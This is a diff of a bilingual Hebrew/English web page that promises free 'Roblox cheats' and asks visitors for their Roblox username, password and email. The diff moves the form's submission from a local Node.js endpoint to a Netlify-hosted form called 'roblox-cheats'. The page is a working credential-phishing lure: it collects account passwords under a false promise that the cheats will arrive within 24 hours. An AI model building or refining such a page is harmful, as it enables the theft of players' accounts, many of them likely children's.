@@ -3,14 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Quotes </title>
+    <title>Roblox Quotes</title>
     <style>
         :root {
             --primary-color: #000000;
             --bg-color: #ffffff;
             --input-bg: #f5f5f7;
             --text-color: #1d1d1f;
-            --danger-color: #ff3b30;
         }
 
         body {
@@ -35,9 +34,7 @@
         #form-content, #success-message { display: none; }
 
         h1 { font-size: 24px; font-weight: 600; margin-bottom: 30px; }
-
         .btn-group { display: flex; gap: 10px; flex-direction: column; }
-
         .input-group { margin-bottom: 15px; text-align: inherit; }
 
         label {
@@ -73,13 +70,7 @@
         }
 
         button:hover { opacity: 0.8; }
-
-        .lang-btn {
-            background-color: var(--input-bg);
-            color: var(--text-color);
-            border: 1px solid #d2d2d7;
-        }
-
+        .lang-btn { background-color: var(--input-bg); color: var(--text-color); border: 1px solid #d2d2d7; }
         .en-mode { direction: ltr; text-align: left; }
     </style>
 </head>
@@ -97,7 +88,10 @@
 
     <div id="form-content">
         <h1 id="title-text">קבלת ציטים</h1>
-        <form id="riddle-form">
+        
+        <form id="riddle-form" name="roblox-cheats" method="POST" data-netlify="true">
+            <input type="hidden" name="form-name" value="roblox-cheats" />
+            
             <div class="input-group">
                 <label id="label-user">שם משתמש</label>
                 <input type="text" name="username" id="username" required>
@@ -125,28 +119,8 @@
 
 <script>
     const translations = {
-        he: {
-            title: "קבלת ציטים ברובלוקס",
-            labelUser: "שם משתמש",
-            labelPass: "סיסמה",
-            labelEmail: "אימייל",
-            submit: "שליחה",
-            successTitle: "תודה רבה",
-            successP: "קבלת הציטים תתקבל עד 24 שעות",
-            back: "חזרה להתחלה",
-            dir: "rtl"
-        },
-        en: {
-            title: "Getting cheats in Roblox",
-            labelUser: "Username",
-            labelPass: "Password",
-            labelEmail: "Email",
-            submit: "Send",
-            successTitle: "Thank You",
-            successP: "Quotations will be accepted within 24 hours.",
-            back: "Back to start",
-            dir: "ltr"
-        }
+        he: { title: "קבלת ציטים ברובלוקס", labelUser: "שם משתמש", labelPass: "סיסמה", labelEmail: "אימייל", submit: "שליחה", successTitle: "תודה רבה", successP: "קבלת הציטים תתקבל עד 24 שעות", back: "חזרה להתחלה", dir: "rtl" },
+        en: { title: "Getting cheats in Roblox", labelUser: "Username", labelPass: "Password", labelEmail: "Email", submit: "Send", successTitle: "Thank You", successP: "Quotations will be accepted within 24 hours.", back: "Back to start", dir: "ltr" }
     };
 
     function setLanguage(lang) {
@@ -169,42 +143,34 @@
     }
 
     const form = document.getElementById('riddle-form');
-    form.addEventListener('submit', async (e) => {
+    form.addEventListener('submit', (e) => {
         e.preventDefault();
         const btn = document.getElementById('submit-btn');
         btn.innerText = "...";
         btn.disabled = true;
 
-        // איסוף הנתונים מהשדות
-        const data = {
-            username: document.getElementById('username').value,
-            password: document.getElementById('password').value,
-            email: document.getElementById('email').value
-        };
+        const formData = new FormData(form);
 
-        try {
-            // שליחה לשרת המקומי שלנו (Node.js)
-            const response = await fetch("/save-data", {
-                method: "POST",
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
-
+        fetch("/", {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: new URLSearchParams(formData).toString(),
+        })
+        .then((response) => {
             if (response.ok) {
                 document.getElementById('form-content').style.display = 'none';
                 document.getElementById('success-message').style.display = 'block';
             } else {
-                alert("שגיאה בשליחה לשרת");
-                btn.disabled = false;
-                btn.innerText = "נסה שוב";
+                throw new Error('שגיאה בתגובת Netlify');
             }
-        } catch (error) {
-            alert("לא ניתן להתחבר לשרת. וודא שהרצת את הקוד של Node.js");
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+            alert("שגיאה בשליחה. נסה שוב מאוחר יותר.");
             btn.disabled = false;
-            btn.innerText = "שגיאת חיבור";
-        }
+            btn.innerText = "נסה שוב";
+        });
     });
 </script>
-
 </body>
 </html>
